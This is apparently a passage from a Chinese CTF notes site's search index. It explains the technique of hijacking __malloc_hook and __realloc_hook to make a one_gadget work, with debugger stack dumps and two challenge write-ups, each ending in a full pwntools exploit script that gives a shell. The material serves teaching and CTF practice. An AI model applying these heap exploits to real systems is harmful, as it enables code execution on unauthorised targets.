\u7684\u6570\u91cf\u53d1\u751f\u53d8\u5316\u4f1a\u5f71\u54cd rsp \u7684\u5730\u5740\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u63a7\u5236 rsp \u7684\u53d6\u503c\uff0c\u4ece\u800c\u6ee1\u8db3 onegadget \u7684\u6267\u884c\u6761\u4ef6\u3002\u9664\u4e86\u53ef\u4ee5\u63a7\u5236 push \u6570\u91cf\uff0c\u8fd8\u80fd\u901a\u8fc7\u504f\u79fb\u5f97\u5230\u5176\u4ed6\u7684 push xxx \u3002 malloc_hook \u4e0e realloc_hook \u914d\u5408 \u00b6 \u5c06 malloc_hook \u52ab\u6301\u4e3a realloc \uff0crealloc_hook \u52ab\u6301\u4e3a onegadget \uff0c\u5b9e\u9645\u8fd0\u884c\u987a\u5e8f\uff1a malloc -> malloc_hook -> realloc -> realloc_hook -> onegadget \u8fd9\u6837\u5c31\u80fd\u7ecf\u8fc7 realloc \u8c03\u6574\u6808\u5e27\u540e\u518d\u8fd0\u884c onegadget \u3002\u5b9e\u9645\u60c5\u51b5\u4e2d\uff0c\u5e76\u4e0d\u662f\u76f4\u63a5\u52ab\u6301 malloc_hook \u4e3a realloc \uff0c\u800c\u662f\u8981\u52a0\u4e0a\u4e00\u5b9a\u7684\u504f\u79fb\uff0c\u4e5f\u5c31\u662f\u8c03\u6574 push \u7684\u6570\u91cf\uff0c\u8ba9\u6808\u5e27\u7ed3\u6784\u6ee1\u8db3 onegadget \u8fd0\u884c\u3002 realloc \u8fd9\u4e2a\u504f\u79fb\u505a\u9898\u8fd8\u662f\u9010\u4e2a\u8bd5\u611f\u89c9\u5feb\u4e00\u70b9\uff0c\u56e0\u4e3a\u8bbe\u60f3\u662f**\u5c11\u4e00\u4e2a push \uff0crsp \u5c31\u4f1a\u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u5185\u5b58\u5355\u5143\uff0c\u5bf9\u5e94\u7684 [rsp+0x30]=[rsp+0x38] ** \uff0c\u4f46\u5b9e\u9645\u4e0a\u6709\u5c11\u90e8\u5206\u4f4d\u7f6e\u53ef\u80fd\u88ab\u5176\u4ed6\u4e1c\u897f\u5199\u5165\u6539\u53d8\u4e86\u539f\u6765\u7684\u503c\u3002\u81ea\u884c\u8c03\u8bd5\u4f53\u4f1a\u4e00\u4e0b\uff1a # 6\u4e2apush pwndbg> x /20gx $rsp 0x7fffffffdcb8: 0x00007ffff7a9195f 0x00007fffffffdd20 0x7fffffffdcc8: 0x00005555555548e0 0x00007fffffffde40 0x7fffffffdcd8: 0x0000000000000000 0x0000000000000000 0x7fffffffdce8: 0x00007ffff7a43ea0 0x00007fffffffde40 0x7fffffffdcf8: 0x0000000000000000 0x00007fffffffdd40 0x7fffffffdd08: 0x00005555555548e0 0x00007fffffffde40 0x7fffffffdd18: 0x0000000000000000 0x0000000000000000 0x7fffffffdd28: 0x0000555555554b71 0x00005555555548e0 0x7fffffffdd38: 0x0000001000000006 0x00007fffffffdd60 0x7fffffffdd48: 0x0000555555554f86 0x00007fffffffde40 # 5\u4e2apush pwndbg> x /20gx $rsp 0x7fffffffdcc0: 0x00007ffff7a9195f 0x00005555555548e0 0x7fffffffdcd0: 0x00007fffffffde40 0x0000000000000000 0x7fffffffdce0: 0x0000000000000000 0x00007ffff7a43ea0 0x7fffffffdcf0: 0x00007fffffffde40 0x0000555555554a23 0x7fffffffdd00: 0x0000000000000000 0x00007fffffffdd40 0x7fffffffdd10: 0x00005555555548e0 0x00007fffffffde40 0x7fffffffdd20: 0x0000000000000000 0x0000555555554b71 0x7fffffffdd30: 0x00005555555548e0 0x0000001000000006 0x7fffffffdd40: 0x00007fffffffdd60 0x0000555555554f86 0x7fffffffdd50: 0x00007fffffffde40 0x0000000100000000 \u539f\u7406\u4e0a\u662f\uff1a \u5c11\u4e00\u4e2a push \uff0crsp \u5c31\u4f1a\u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u5185\u5b58\u5355\u5143\uff0c\u5bf9\u5e94\u7684 [rsp+0x30]=[rsp+0x38] \uff0c\u4f46\u5b9e\u9645\u90e8\u5206\u4f4d\u7f6e\u7684\u503c\u4f1a\u53d8\uff0c\u6240\u4ee5\u9010\u4e2a\u8bd5\uff0c\u901f\u5ea6\u53ef\u80fd\u6bd4\u8ba1\u7b97\u5feb\u3002 \u4f8b\u9898 \u00b6 [V&N2020 \u516c\u5f00\u8d5b]simpleHeap \u00b6 \u57fa\u672c\u529f\u80fd \u00b6 \u4e00\u4e2a\u57fa\u672c\u7684\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u67e5\u6539\u529f\u80fd\u3002\u5404\u9879\u529f\u80fd\u90fd\u662f\u57fa\u4e8e\u4e0b\u6807\u5e8f\u53f7\u5b9a\u4f4d\u64cd\u4f5c\uff0c\u4e0a\u9650\u4e3a10\u4e2a\u5806\uff0c\u5927\u5c0f\u4e3a\u5927\u4e8e 0 \u3001\u5c0f\u4e8e\u7b49\u4e8e 0x6f \u3002\u6ca1\u6709\u7ed3\u6784\u4f53\uff0c\u57fa\u4e8e\u4e24\u4e2a\u5217\u8868\u5b58\u50a8\u5806\u4fe1\u606f\u3002 \u6f0f\u6d1e \u00b6 \u5728\u4fee\u6539\u51fd\u6570\u91cc\uff0c\u8c03\u7528\u51fd\u6570 sub_C39 \u5b8c\u6210\u5bf9\u5806\u4fe1\u606f\u7684\u4fee\u6539\u3002\u4f20\u5165\u7684\u53c2\u6570\u5982\u4e0b\uff1a sub_C39 (( __int64 ) chunk_ptr_list [ v1 ], chunk_size_list [ v1 ]) \u5728\u5904\u7406\u8fb9\u754c\u95ee\u9898\u65f6\uff0c\u9519\u8bef\u4f7f\u7528\u5224\u65ad\u6761\u4ef6\uff0c\u5bfc\u81f4\u6ea2\u51fa 1 \u5b57\u8282\uff0c\u6b63\u786e\u5e94\u8be5 if(i>=size) \uff0c\u5177\u4f53\u903b\u8f91\u5982\u4e0b\uff1a __int64 __fastcall sub_C39 ( __int64 ptr , int size ) { __int64 result ; // rax int i ; // [rsp+1Ch] [rbp-4h] for ( i = 0 ; ; ++ i ) { result = ( unsigned int ) i ; if ( i > size ) // off by one break ; if ( ! read ( 0 , ( void * )( i + ptr ), 1uLL ) ) // \u8f93\u51fa\u9519\u8bef\u7684\u5f02\u5e38\u5904\u7406 exit ( 0 ); if ( * ( _BYTE * )( i + ptr ) == '\\n' ) { result = i + ptr ; * ( _BYTE * ) result = 0 ; return result ; } } return result ; } \u601d\u8def \u00b6 \u4f7f\u7528 off by one \u4f2a\u9020 chunk size\uff0c\u9020\u6210 chunk extend \uff0c\u518d\u5229\u7528 unsorted bin \u7684\u7279\u70b9\uff0c\u6cc4\u9732\u51fa unsorted bin fd \u6307\u9488\u7684 libc \u5730\u5740\u3002 \u5c06\u4e0a\u4e00\u6b65\u4e2d\u7684 chunk extend \u5269\u4e0b\u5728 bin \u4e2d\u7684\u5185\u5b58\u7533\u8bf7\u51fa\u6765\uff0c\u9020\u6210\u4e24\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5730\u5740\uff0c\u914d\u5408 edit \u529f\u80fd\u5b9e\u73b0 houst of spirit \uff0c\u52ab\u6301 __malloc_hook \u3002 \u5b9e\u9645\u6d4b\u8bd5\u540e\u5168\u90e8 onegadget \u56e0\u4e3a\u6808\u73af\u5883\u95ee\u9898\u90fd\u65e0\u6cd5\u6253\u901a\uff0c\u9700\u8981\u7ed3\u5408 malloc_hook \u3001 realloc_hook \u8c03\u6574\u6808\u73af\u5883\u624d\u80fd\u6253\u901a\u3002 \u6ea2\u51fa\u4fee\u6539 chunk size \u9020\u6210 chunk extend \uff0cchunk0 \u7528\u4e8e\u6ea2\u51fa chunk1 \uff0cchunk2 \u7528\u4e8e\u8bfb\u53d6 unsorted bin fd \u6307\u9488\uff0cchunk3 \u9632\u6b62 fake chunk \u4e0e topchunk \u5408\u5e76\u3002\u6ea2\u51fa size \u662f\u7ecf\u8fc7\u8ba1\u7b97\u7b26\u5408 house of spirit \u8981\u6c42\uff1a create ( 0x18 , 's' ) create ( 0x48 , 'k' ) create ( 0x68 , 'y' ) #2 create ( 0x10 , 'e' ) payload = 'a' * 0x18 + ' \\xc1 ' edit ( 0 , payload ) free ( 1 ) create ( 0x48 , 'yyds' ) show ( 2 ) \u6cc4\u9732 libc \u5730\u5740\u540e\uff0c\u5c06 bin \u4e2d\u5269\u4f59\u5185\u5b58\u7533\u8bf7\u51fa\u6765\uff0c\u8be5\u6307\u9488\u4e0e chunk2 \u6307\u5411\u76f8\u540c\u5730\u5740\uff0c\u4efb\u9009\u5176\u4e00\u91ca\u653e\uff0c\u518d\u7528\u53e6\u5916\u4e00\u4e2a\u4fee\u6539 fastbin fd \u6307\u9488\uff1a create ( 0x68 , 'skye' ) #4 free ( 4 ) payload = p64 ( malloc_hook - 27 - 8 ) + ' \\n ' edit ( 2 , payload ) \u6b63\u5e38\u6765\u8bf4\u5c06 malloc_hook \u52ab\u6301\u4e3a onegadget \u5373\u53ef\uff0c\u4f46\u662f\u6d4b\u8bd5\u53d1\u73b0\u8fd9\u6761\u9898\u76ee\u7684\u6808\u73af\u5883\u4e0d\u6ee1\u8db3\u5168\u90e8 onegadget \u6761\u4ef6\uff0c\u8fd9\u5c31\u9700\u8981\u8c03\u6574\u9635\u7ed3\u6784\uff0c\u4f7f onegadget \u751f\u6548\u3002 \u9700\u8981\u914d\u5408\u4f7f\u7528 realloc_hook \u548c malloc_hook\u3002 \u5c06 malloc_hook \u52ab\u6301\u4e3a realloc \uff0crealloc_hook \u52ab\u6301\u4e3a onegadget \u3002\u7136\u540e\u901a\u8fc7\u591a\u6b21\u5c1d\u8bd5\u786e\u5b9a\u504f\u79fb\u4e3a 12 \u3002 EXP \u00b6 from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./vn_pwn_simpleHeap\" ) # p = remote(\"node3.buuoj.cn\",29864) elf = ELF ( \"./vn_pwn_simpleHeap\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) # libc = ELF(\"./libc-2.23.so\") def create ( size , content ): p . sendlineafter ( \"choice: \" , '1' ) p . sendlineafter ( '?' , str ( size )) p . sendafter ( ':' , content ) def edit ( id , content ): p . sendlineafter ( \"choice: \" , '2' ) p . sendlineafter ( '?' , str ( id )) p . sendafter ( ':' , content ) def show ( id ): p . sendlineafter ( \"choice: \" , '3' ) p . sendlineafter ( '?' , str ( id )) def free ( id ): p . sendlineafter ( \"choice: \" , '4' ) p . sendlineafter ( '?' , str ( id )) create ( 0x18 , 's' ) create ( 0x48 , 'k' ) create ( 0x68 , 'y' ) #2 create ( 0x10 , 'e' ) payload = 'a' * 0x18 + ' \\xc1 ' edit ( 0 , payload ) free ( 1 ) create ( 0x48 , 'yyds' ) show ( 2 ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_base = leak_addr - 0x3c4b78 malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] log . info ( \"malloc_hook:\" + hex ( malloc_hook )) realloc_hook = libc_base + libc . sym [ '__realloc_hook' ] log . info ( \"realloc_hook:\" + hex ( realloc_hook )) realloc = libc_base + libc . sym [ 'realloc' ] log . info ( \"realloc:\" + hex ( realloc )) create ( 0x68 , 'skye' ) #4 free ( 4 ) payload = p64 ( malloc_hook - 27 - 8 ) + ' \\n ' edit ( 2 , payload ) create ( 0x68 , 'a' ) create ( 0x68 , 'b' ) #5 one = [ 0x45226 , 0x4527a , 0xf0364 , 0xf1207 ] # one = [0x45216,0x4526a,0xf02a4,0xf1147] onegadget = libc_base + one [ 1 ] log . info ( \"one:\" + hex ( onegadget )) payload = 'a' * 11 + p64 ( onegadget ) + p64 ( realloc + 12 ) + ' \\n ' edit ( 5 , payload ) gdb . attach ( p ) # create(0x10,'skye,yyds') p . sendlineafter ( \"choice: \" , '1' ) p . sendlineafter ( '?' , str ( 0x10 )) p . interactive () roarctf_2019_easy_pwn \u00b6 \u57fa\u672c\u529f\u80fd \u00b6 \u4e00\u4e2a\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u67e5\u6539\u529f\u80fd\u3002\u6240\u6709\u529f\u80fd\u90fd\u662f\u57fa\u4e8e\u5217\u8868\u7684\u4e0b\u6807\u5b9a\u4f4d\u64cd\u4f5c\u5bf9\u8c61\u3002\u7528 3 \u4e2a\u5217\u8868\u7ef4\u62a4\u5806\uff1achunk_inuse\u3001chunk_size\u3001chunk_ptr\u3002 \u6f0f\u6d1e \u00b6 \u5728 edit \u529f\u80fd\u91cc\u9762 sub_E26 \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u5904\u7406\u8f93\u5165\u957f\u5ea6\u7684\uff0c\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff1a __int64 __fastcall check_size ( signed int size , unsigned int input_length ) { __int64 result ; // rax if ( size > ( signed int ) input_length ) return input_length ; if ( input_length - size == 10 ) LODWORD ( result ) = size + 1 ; //off by one else LODWORD ( result ) = size ; return ( unsigned int ) result ; } \u5f53\u6211\u4eec\u8981\u6c42\u5199\u5165\u7684\u957f\u5ea6\uff08input_length\uff09\u5927\u4e8e\u5806 size 10 \u4e2a\u5b57\u8282\u65f6\uff0c\u5c31\u53ef\u4ee5\u5199\u5165 size + 1 \u5b57\u8282\uff0c\u9020\u6210 off by one \u3002 \u601d\u8def \u00b6 \u8fd9\u6761\u9898\u76ee\u548c [V&N2020 \u516c\u5f00\u8d5b]simpleHeap \u601d\u8def\u4e00\u6837\u3002 \u4f7f\u7528 off by one \u4f2a\u9020 chunk size\uff0c\u9020\u6210 chunk extend \uff0c\u518d\u5229\u7528 unsorted bin \u7684\u7279\u70b9\uff0c\u6cc4\u9732\u51fa unsorted bin fd \u6307\u9488\u7684 libc \u5730\u5740\u3002 \u5c06\u4e0a\u4e00\u6b65\u4e2d\u7684 chunk extend \u5269\u4e0b\u5728 bin \u4e2d\u7684\u5185\u5b58\u7533\u8bf7\u51fa\u6765\uff0c\u9020\u6210\u4e24\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5730\u5740\uff0c\u914d\u5408 edit \u529f\u80fd\u5b9e\u73b0 houst of spirit \uff0c\u52ab\u6301 __malloc_hook \u3002 \u5b9e\u9645\u6d4b\u8bd5\u540e\u5168\u90e8 onegadget \u56e0\u4e3a\u6808\u73af\u5883\u95ee\u9898\u90fd\u65e0\u6cd5\u6253\u901a\uff0c\u9700\u8981\u7ed3\u5408 malloc_hook \u3001 realloc_hook \u8c03\u6574\u6808\u73af\u5883\u624d\u80fd\u6253\u901a\u3002 EXP \u00b6 from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) # p = process(\"./roarctf_2019_easy_pwn\") p = remote ( \"node3.buuoj.cn\" , 29259 ) elf = ELF ( \"./roarctf_2019_easy_pwn\" ) libc = ELF ( \"./libc-2.23.so\" ) # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") def create ( size ): p . recvuntil ( \"choice: \" ) p . sendline ( \"1\" ) p . recvuntil ( \": \" ) p . sendline ( str ( size )) def edit ( index , size , content ): p . recvuntil ( \"choice: \" ) p . sendline ( \"2\" ) p . recvuntil ( \": \" ) p . sendline ( str ( index )) p . recvuntil ( \": \" ) p . sendline ( str ( size )) p . recvuntil ( \": \" ) p . send ( content ) def free ( index ): p . recvuntil ( \": \" ) p . sendline ( \"3\" ) p . recvuntil ( \": \" ) p . sendline ( str ( index )) def show ( index ): p . recvuntil ( \": \" ) p . sendline ( \"4\" ) p . recvuntil ( \": \" ) p . sendline ( str ( index )) create ( 0x18 ) #overwrite create ( 0x68 ) create ( 0x68 ) #2 create ( 0x10 ) #protect payload = 'a' * 0x18 + ' \\xe1 ' edit ( 0 , len ( payload ) - 1 + 10 , payload ) free ( 1 ) create ( 0x68 ) show ( 2 ) p . recvuntil ( \"content: \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_base = leak_addr - 0x3c4b78 malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] log . info ( \"malloc_hook:\" + hex ( malloc_hook )) realloc = libc_base + libc . sym [ 'realloc' ] log . info ( \"realloc:\" + hex ( realloc )) realloc_hook = libc_base + libc . sym [ '__realloc_hook' ] log . info ( \"realloc_hook:\" + hex ( realloc_hook )) create ( 0x68 ) free ( 4 ) payload = p64 ( malloc_hook - 27 - 8 ) edit ( 2 , len ( payload ), payload ) create ( 0x68 ) create ( 0x68 ) # one = [0x45226,0x4527a,0xf0364,0xf1207] one = [ 0x45216 , 0x4526a , 0xf02a4 , 0xf1147 ] onegadget = libc_base + one [ 1 ] log . info ( \"onegadget:\" + hex ( onegadget )) payload = 'a' * 11 + p64 ( onegadget ) + p64 ( realloc ) edit ( 5 , len ( payload ), payload ) create ( 0x10 ) # gdb.attach(p) p . interactive () \u53c2\u8003\u6587\u7ae0 \u00b6 [\u539f\u521b]\u5806\u7684\u516d\u79cd\u5229\u7528\u624b\u6cd5 [pwn]\u5806\uff1arealloc_hook\u63a7\u5236\u6808\u7ed3\u6784\u8fbe\u6210onegadget pwn\u5b66\u4e60\u7cfb\u5217\u4e4bExtend the chunk\u53carealloc_hook\u5229\u7528","title":"realloc"},{"location":"Pwn/glibc-heap/realloc/#realloc_hook-onegadget","text":"\u5728\u67d0\u4e9b\u5806\u7684\u9898\u76ee\u5f53\u4e2d\uff0c\u7531\u4e8e\u9650\u5236\u53ea\u80fd\u4f7f\u7528 house of spirit \u7b49\u65b9\u6cd5\u52ab\u6301 malloc_hook \uff0c\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u662f\u5f80 malloc_hook \u5199\u5165 onegadget \uff0c\u518d\u6b21\u7533\u8bf7\u5806\u6765 getshell \u3002 \u7531\u4e8e\u6808\u5e27\u60c5\u51b5\u4e0d\u6ee1\u8db3\uff0c\u67e5\u8be2\u5230\u7684\u6240\u6709 onegadget \u53ef\u80fd\u90fd\u6253\u4e0d\u901a\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u8003\u8651\u4e0b\u7528 malloc_hook \u548c realloc_hook \u7ed3\u5408\u3002\u5148\u901a\u8fc7 realloc \u8c03\u6574\u6808\u5e27\uff0c\u7136\u540e\u5728\u8fd0\u884c onegadget \u3002","title":"\u901a\u8fc7 realloc_hook \u8c03\u6574\u6808\u5e27\u4f7f onegadget \u751f\u6548"},{"location":"Pwn/glibc-heap/realloc/#realloc","text":"realloc \u5728\u5e93\u51fd\u6570\u4e2d\u7684\u4f5c\u7528\u662f\u91cd\u65b0\u8c03\u6574 malloc \u6216 calloc \u6240\u5206\u914d\u7684\u5806\u5927\u5c0f\u3002\u5b83\u548c malloc \u51fd\u6570\u4e00\u6837\u6709 hook \u51fd\u6570\uff0c\u5f53 hook \u51fd\u6570\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u5c31\u4f1a\u8df3\u8f6c\u8fd0\u884c hook \u51fd\u6570\uff08\u548c malloc_hook \u4e00\u6837\u7684\uff09\u3002 __int64 __fastcall realloc ( signed __int64 a1 , unsigned __int64 a2 , __int64 a3 ) { \u2026\u2026 if ( _realloc_hook ) return _realloc_hook ( a1 , a2 , retaddr ); \u2026\u2026 \u770b\u770b realloc \u7684\u6c47\u7f16\u4ee3\u7801\uff1a\uff08\u53ef\u4ee5\u628a libc \u62d6\u5230 ida \u4e2d\u770b\uff0c\u4e5f\u53ef\u4ee5\u6cc4\u9732\u5730\u5740\u540e gdb \u8c03\u8bd5\u67e5\u770b x /20i [addr] \uff09 .text:00000000000846C0 realloc proc near ; DATA XREF: LOAD:0000000000006BA0\u2191o .text:00000000000846C0 ; __unwind { .text:00000000000846C0 push r15 ; Alternative name is '__libc_realloc' .text:00000000000846C2 push r14 .text:00000000000846C4 push r13 .text:00000000000846C6 push r12 .text:00000000000846C8 mov r13, rsi .text:00000000000846CB push rbp .text:00000000000846CC push rbx .text:00000000000846CD mov rbx, rdi .text:00000000000846D0 sub rsp, 38h .text:00000000000846D4 mov rax, cs:__realloc_hook_ptr .text:00000000000846DB mov rax, [rax] .text:00000000000846DE test rax, rax .text:00000000000846E1 jnz loc_848E8 ; \u8df3\u8f6c\u6267\u884c realloc_hook .text:00000000000846E7 test rsi, rsi .text:00000000000846EA jnz short loc_846F5 .text:00000000000846EC test rdi, rdi .text:00000000000846EF jnz loc_84960 \u51fd\u6570\u4e00\u5f00\u59cb\u6709\u5f88\u591a\u7684 push \uff0crealloc \u51fd\u6570\u5148\u6267\u884c push \u538b\u6808\uff0c\u7136\u540e\u5728\u8df3\u8f6c\u6267\u884c realloc_hook \u5b58\u50a8\u7684\u51fd\u6570\u3002\u6211\u4eec\u5c31\u662f\u5229\u7528\u8fd9\u4e9b push \u8c03\u6574\u6808\u5e27\u3002push \u7684\u6570\u91cf\u53d1\u751f\u53d8\u5316\u4f1a\u5f71\u54cd rsp \u7684\u5730\u5740\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u63a7\u5236 rsp \u7684\u53d6\u503c\uff0c\u4ece\u800c\u6ee1\u8db3 onegadget \u7684\u6267\u884c\u6761\u4ef6\u3002\u9664\u4e86\u53ef\u4ee5\u63a7\u5236 push \u6570\u91cf\uff0c\u8fd8\u80fd\u901a\u8fc7\u504f\u79fb\u5f97\u5230\u5176\u4ed6\u7684 push xxx \u3002","title":"\u4e86\u89e3 realloc"},{"location":"Pwn/glibc-heap/realloc/#malloc_hook-realloc_hook","text":"\u5c06 malloc_hook \u52ab\u6301\u4e3a realloc \uff0crealloc_hook \u52ab\u6301\u4e3a onegadget \uff0c\u5b9e\u9645\u8fd0\u884c\u987a\u5e8f\uff1a malloc -> malloc_hook -> realloc -> realloc_hook -> onegadget \u8fd9\u6837\u5c31\u80fd\u7ecf\u8fc7 realloc \u8c03\u6574\u6808\u5e27\u540e\u518d\u8fd0\u884c onegadget \u3002\u5b9e\u9645\u60c5\u51b5\u4e2d\uff0c\u5e76\u4e0d\u662f\u76f4\u63a5\u52ab\u6301 malloc_hook \u4e3a realloc \uff0c\u800c\u662f\u8981\u52a0\u4e0a\u4e00\u5b9a\u7684\u504f\u79fb\uff0c\u4e5f\u5c31\u662f\u8c03\u6574 push \u7684\u6570\u91cf\uff0c\u8ba9\u6808\u5e27\u7ed3\u6784\u6ee1\u8db3 onegadget \u8fd0\u884c\u3002 realloc \u8fd9\u4e2a\u504f\u79fb\u505a\u9898\u8fd8\u662f\u9010\u4e2a\u8bd5\u611f\u89c9\u5feb\u4e00\u70b9\uff0c\u56e0\u4e3a\u8bbe\u60f3\u662f**\u5c11\u4e00\u4e2a push \uff0crsp \u5c31\u4f1a\u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u5185\u5b58\u5355\u5143\uff0c\u5bf9\u5e94\u7684 [rsp+0x30]=[rsp+0x38] ** \uff0c\u4f46\u5b9e\u9645\u4e0a\u6709\u5c11\u90e8\u5206\u4f4d\u7f6e\u53ef\u80fd\u88ab\u5176\u4ed6\u4e1c\u897f\u5199\u5165\u6539\u53d8\u4e86\u539f\u6765\u7684\u503c\u3002\u81ea\u884c\u8c03\u8bd5\u4f53\u4f1a\u4e00\u4e0b\uff1a # 6\u4e2apush pwndbg> x /20gx $rsp 0x7fffffffdcb8: 0x00007ffff7a9195f 0x00007fffffffdd20 0x7fffffffdcc8: 0x00005555555548e0 0x00007fffffffde40 0x7fffffffdcd8: 0x0000000000000000 0x0000000000000000 0x7fffffffdce8: 0x00007ffff7a43ea0 0x00007fffffffde40 0x7fffffffdcf8: 0x0000000000000000 0x00007fffffffdd40 0x7fffffffdd08: 0x00005555555548e0 0x00007fffffffde40 0x7fffffffdd18: 0x0000000000000000 0x0000000000000000 0x7fffffffdd28: 0x0000555555554b71 0x00005555555548e0 0x7fffffffdd38: 0x0000001000000006 0x00007fffffffdd60 0x7fffffffdd48: 0x0000555555554f86 0x00007fffffffde40 # 5\u4e2apush pwndbg> x /20gx $rsp 0x7fffffffdcc0: 0x00007ffff7a9195f 0x00005555555548e0 0x7fffffffdcd0: 0x00007fffffffde40 0x0000000000000000 0x7fffffffdce0: 0x0000000000000000 0x00007ffff7a43ea0 0x7fffffffdcf0: 0x00007fffffffde40 0x0000555555554a23 0x7fffffffdd00: 0x0000000000000000 0x00007fffffffdd40 0x7fffffffdd10: 0x00005555555548e0 0x00007fffffffde40 0x7fffffffdd20: 0x0000000000000000 0x0000555555554b71 0x7fffffffdd30: 0x00005555555548e0 0x0000001000000006 0x7fffffffdd40: 0x00007fffffffdd60 0x0000555555554f86 0x7fffffffdd50: 0x00007fffffffde40 0x0000000100000000 \u539f\u7406\u4e0a\u662f\uff1a \u5c11\u4e00\u4e2a push \uff0crsp \u5c31\u4f1a\u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u5185\u5b58\u5355\u5143\uff0c\u5bf9\u5e94\u7684 [rsp+0x30]=[rsp+0x38] \uff0c\u4f46\u5b9e\u9645\u90e8\u5206\u4f4d\u7f6e\u7684\u503c\u4f1a\u53d8\uff0c\u6240\u4ee5\u9010\u4e2a\u8bd5\uff0c\u901f\u5ea6\u53ef\u80fd\u6bd4\u8ba1\u7b97\u5feb\u3002","title":"malloc_hook \u4e0e realloc_hook \u914d\u5408"},{"location":"Pwn/glibc-heap/realloc/#_1","text":"","title":"\u4f8b\u9898"},{"location":"Pwn/glibc-heap/realloc/#vn2020-simpleheap","text":"","title":"[V&amp;N2020 \u516c\u5f00\u8d5b]simpleHeap"},{"location":"Pwn/glibc-heap/realloc/#_2","text":"\u4e00\u4e2a\u57fa\u672c\u7684\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u67e5\u6539\u529f\u80fd\u3002\u5404\u9879\u529f\u80fd\u90fd\u662f\u57fa\u4e8e\u4e0b\u6807\u5e8f\u53f7\u5b9a\u4f4d\u64cd\u4f5c\uff0c\u4e0a\u9650\u4e3a10\u4e2a\u5806\uff0c\u5927\u5c0f\u4e3a\u5927\u4e8e 0 \u3001\u5c0f\u4e8e\u7b49\u4e8e 0x6f \u3002\u6ca1\u6709\u7ed3\u6784\u4f53\uff0c\u57fa\u4e8e\u4e24\u4e2a\u5217\u8868\u5b58\u50a8\u5806\u4fe1\u606f\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/realloc/#_3","text":"\u5728\u4fee\u6539\u51fd\u6570\u91cc\uff0c\u8c03\u7528\u51fd\u6570 sub_C39 \u5b8c\u6210\u5bf9\u5806\u4fe1\u606f\u7684\u4fee\u6539\u3002\u4f20\u5165\u7684\u53c2\u6570\u5982\u4e0b\uff1a sub_C39 (( __int64 ) chunk_ptr_list [ v1 ], chunk_size_list [ v1 ]) \u5728\u5904\u7406\u8fb9\u754c\u95ee\u9898\u65f6\uff0c\u9519\u8bef\u4f7f\u7528\u5224\u65ad\u6761\u4ef6\uff0c\u5bfc\u81f4\u6ea2\u51fa 1 \u5b57\u8282\uff0c\u6b63\u786e\u5e94\u8be5 if(i>=size) \uff0c\u5177\u4f53\u903b\u8f91\u5982\u4e0b\uff1a __int64 __fastcall sub_C39 ( __int64 ptr , int size ) { __int64 result ; // rax int i ; // [rsp+1Ch] [rbp-4h] for ( i = 0 ; ; ++ i ) { result = ( unsigned int ) i ; if ( i > size ) // off by one break ; if ( ! read ( 0 , ( void * )( i + ptr ), 1uLL ) ) // \u8f93\u51fa\u9519\u8bef\u7684\u5f02\u5e38\u5904\u7406 exit ( 0 ); if ( * ( _BYTE * )( i + ptr ) == '\\n' ) { result = i + ptr ; * ( _BYTE * ) result = 0 ; return result ; } } return result ; }","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/realloc/#_4","text":"\u4f7f\u7528 off by one \u4f2a\u9020 chunk size\uff0c\u9020\u6210 chunk extend \uff0c\u518d\u5229\u7528 unsorted bin \u7684\u7279\u70b9\uff0c\u6cc4\u9732\u51fa unsorted bin fd \u6307\u9488\u7684 libc \u5730\u5740\u3002 \u5c06\u4e0a\u4e00\u6b65\u4e2d\u7684 chunk extend \u5269\u4e0b\u5728 bin \u4e2d\u7684\u5185\u5b58\u7533\u8bf7\u51fa\u6765\uff0c\u9020\u6210\u4e24\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5730\u5740\uff0c\u914d\u5408 edit \u529f\u80fd\u5b9e\u73b0 houst of spirit \uff0c\u52ab\u6301 __malloc_hook \u3002 \u5b9e\u9645\u6d4b\u8bd5\u540e\u5168\u90e8 onegadget \u56e0\u4e3a\u6808\u73af\u5883\u95ee\u9898\u90fd\u65e0\u6cd5\u6253\u901a\uff0c\u9700\u8981\u7ed3\u5408 malloc_hook \u3001 realloc_hook \u8c03\u6574\u6808\u73af\u5883\u624d\u80fd\u6253\u901a\u3002 \u6ea2\u51fa\u4fee\u6539 chunk size \u9020\u6210 chunk extend \uff0cchunk0 \u7528\u4e8e\u6ea2\u51fa chunk1 \uff0cchunk2 \u7528\u4e8e\u8bfb\u53d6 unsorted bin fd \u6307\u9488\uff0cchunk3 \u9632\u6b62 fake chunk \u4e0e topchunk \u5408\u5e76\u3002\u6ea2\u51fa size \u662f\u7ecf\u8fc7\u8ba1\u7b97\u7b26\u5408 house of spirit \u8981\u6c42\uff1a create ( 0x18 , 's' ) create ( 0x48 , 'k' ) create ( 0x68 , 'y' ) #2 create ( 0x10 , 'e' ) payload = 'a' * 0x18 + ' \\xc1 ' edit ( 0 , payload ) free ( 1 ) create ( 0x48 , 'yyds' ) show ( 2 ) 